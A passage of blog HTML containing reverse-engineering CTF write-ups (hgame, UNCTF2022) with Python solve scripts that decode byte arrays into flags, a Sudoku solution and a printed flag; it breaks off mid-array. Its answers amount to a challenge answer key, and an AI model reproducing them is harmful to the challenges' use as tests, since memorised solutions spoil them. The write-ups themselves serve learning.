class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">b = [</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x37</span>, <span class="number">0xa0</span>, <span class="number">0x4e</span>, <span class="number">0xfd</span>, <span class="number">0xda</span>,  <span class="number">0x2</span>, <span class="number">0x46</span>, </span><br><span class="line">    <span class="number">0x3c</span>, <span class="number">0x6e</span>, <span class="number">0xfa</span>, <span class="number">0x21</span>, <span class="number">0xcf</span>, <span class="number">0x9c</span>, <span class="number">0xd9</span>, <span class="number">0xaf</span>, </span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x33</span>, <span class="number">0x47</span>, <span class="number">0xb9</span>,  <span class="number">0xd</span>, <span class="number">0xec</span>, <span class="number">0x4e</span>, <span class="number">0xe0</span>, </span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0xc4</span>, <span class="number">0xd1</span>, <span class="number">0x3a</span>, <span class="number">0xb2</span>, <span class="number">0xa9</span>, <span class="number">0x32</span>, </span><br><span class="line">    <span class="number">0x2</span>,  <span class="number">0x5d</span>, <span class="number">0x50</span>, <span class="number">0xa7</span>, <span class="number">0x83</span>, <span class="number">0x4a</span>, <span class="number">0x39</span>, <span class="number">0x82</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0x50</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0x98</span>, <span class="number">0xA1</span>, <span class="number">0x41</span>, <span class="number">0x36</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x31</span>, <span class="number">0xCB</span>, <span class="number">0x52</span>, <span class="number">0x90</span>, <span class="number">0xF1</span>, <span class="number">0xAC</span>, <span class="number">0xCC</span>, </span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x6C</span>, <span class="number">0x2A</span>, <span class="number">0x89</span>, <span class="number">0x7F</span>, <span class="number">0xDF</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, </span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0xE6</span>, <span class="number">0xA2</span>, <span class="number">0xE0</span>, <span class="number">0x59</span>, <span class="number">0xC7</span>, <span class="number">0xC5</span>, <span class="number">0x46</span>, </span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x29</span>, <span class="number">0x38</span>, <span class="number">0x93</span>, <span class="number">0xED</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0xFF</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    x = flag[i] ^ b[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>hgame{Cpp_1s_much_m0r3_dlff1cult_th4n_C}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF2022wp</title>
      <link href="/2023/03/06/UNCTF2022wp/"/>
      <url>/2023/03/06/UNCTF2022wp/</url>
      
        <content type="html"><![CDATA[        <h1 id="whereisyourkey"   >          <a href="#whereisyourkey" class="heading-link"><i class="fas fa-link"></i></a><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h1>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v5 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">v5[<span class="number">0</span>] = <span class="number">0x76</span></span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">0x67</span></span><br><span class="line">v5[<span class="number">2</span>] = <span class="number">0x70</span></span><br><span class="line">v5[<span class="number">3</span>] = <span class="number">0x6B</span></span><br><span class="line">v5[<span class="number">4</span>] = <span class="number">0x63</span></span><br><span class="line">v5[<span class="number">5</span>] = <span class="number">0x6D</span></span><br><span class="line">v5[<span class="number">6</span>] = <span class="number">0x68</span></span><br><span class="line">v5[<span class="number">7</span>] = <span class="number">0x6E</span></span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">0x63</span></span><br><span class="line">v5[<span class="number">9</span>] = <span class="number">0x69</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> v5[i] == <span class="number">0x6D</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(v5[i] &lt;= <span class="number">110</span>):</span><br><span class="line">        v5[i] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v5[i] += <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v5[i]&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure>        <h1 id="ezzzzre"   >          <a href="#ezzzzre" class="heading-link"><i class="fas fa-link"></i></a><a href="#ezzzzre" class="headerlink" title="ezzzzre"></a>ezzzzre</h1>      <p>upx壳，用工具脱</p><p>简单的加密</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211172211495.png" alt="image-20221117221123453"></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;HELLOCTF&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>( ((<span class="built_in">ord</span>(i)*<span class="number">2</span>)-<span class="number">69</span>) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure>        <h1 id="Sudoku"   >          <a href="#Sudoku" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h1>      <p>动调</p><p>v12</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8 5 2 4 9 1 6 7 3</span><br><span class="line">1 9 6 7 3 8 2 5 4</span><br><span class="line">4 3 7 5 6 2 9 1 8</span><br><span class="line">5 2 8 1 4 6 3 9 7</span><br><span class="line">3 7 4 9 2 5 8 6 1</span><br><span class="line">9 6 1 3 8 7 4 2 5</span><br><span class="line">2 1 9 8 5 4 7 3 6</span><br><span class="line">7 4 3 6 1 9 5 8 2</span><br><span class="line">6 8 5 2 7 3 1 4 9</span><br></pre></td></tr></table></div></figure><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vme = <span class="number">50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;UNCTF&#123;&quot;</span> +</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">29</span> + vme) + <span class="built_in">chr</span>(<span class="number">15</span> + vme) + <span class="built_in">chr</span>(<span class="number">29</span> + vme) + <span class="built_in">chr</span>(<span class="number">24</span> + vme) +</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">39</span> + vme) + <span class="built_in">chr</span>(<span class="number">25</span> + vme) + <span class="built_in">chr</span>(<span class="number">29</span> + vme) + <span class="built_in">chr</span>(<span class="number">20</span> + vme) +</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">32</span> + vme) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h1 id="halo"   >          <a href="#halo" class="heading-link"><i class="fas fa-link"></i></a><a href="#halo" class="headerlink" title="halo"></a>halo</h1>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x55</span>, <span class="number">0x0B</span>, <span class="number">0x68</span>, <span class="number">0x0C</span>, <span class="number">0x73</span>, <span class="number">0x3E</span>, <span class="number">0x0C</span>, <span class="number">0x3A</span>, <span class="number">0x5D</span>, <span class="number">0x1B</span>,</span><br><span class="line">          <span class="number">0x21</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x20</span>, <span class="number">0x4C</span>, <span class="number">0x71</span>, <span class="number">0x58</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x2C</span>,</span><br><span class="line">          <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x58</span>, <span class="number">0x77</span>, <span class="number">0x0E</span>, <span class="number">0x72</span>, <span class="number">0x5B</span>, <span class="number">0x26</span>, <span class="number">0x0B</span>, <span class="number">0x70</span>,</span><br><span class="line">          <span class="number">0x0A</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x77</span>, <span class="number">0x36</span>, <span class="number">0x76</span>, <span class="number">0x37</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x72</span>,</span><br><span class="line">          <span class="number">0x6D</span>, <span class="number">0x27</span>, <span class="number">0x3F</span>, <span class="number">0x77</span>, <span class="number">0x26</span>]</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    flag[i] ^= <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ i ^ flag[i-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211132130532.png" alt="image-20221113213011482" style="zoom:33%;" /><p>异或满足交换律</p>        <h1 id="Rusty-CPU"   >          <a href="#Rusty-CPU" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rusty-CPU" class="headerlink" title="Rusty CPU"></a>Rusty CPU</h1>      <p>ida64位无壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211152340219.png" alt="image-20221115234054163"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202211152342531.png" alt="image-20221115234200492"></p><p>看到将输入编码后塞进switch，猜测是虚拟机</p><p>找到操作码后就直接写脚本了</p><p>我是选择倒着运行去逆向的。</p><p>不过这题比较简单每一位都是单独加密的</p><p><del>手写也不是不行</del></p><p>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x83</span>, <span class="number">0x67</span>, <span class="number">0x70</span>, <span class="number">0x29</span>, <span class="number">0x27</span>, <span class="number">0x7F</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x59</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x83</span>, <span class="number">0x24</span>, <span class="number">0x91</span>,</span><br><span class="line">    <span class="number">0x7B</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x16</span>, <span class="number">0x84</span>, <span class="number">0x58</span>, <span class="number">0x93</span>, <span class="number">0x62</span>, <span class="number">0x5D</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x59</span>, <span class="number">0x4F</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">op = [</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x19</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x12</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1F</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x12</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1B</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1E</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1E</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1C</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x20</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x02</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x29</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1F</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2B</span>, <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1D</span>, <span class="number">0x80</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1E</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0x1B</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1D</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2A</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2A</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x1C</span>, <span class="number">0x81</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x30</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x25</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0x2D</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x26</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0x2F</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2B</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x22</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x30</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x26</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2F</span>, <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2D</span>, <span class="number">0x80</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span 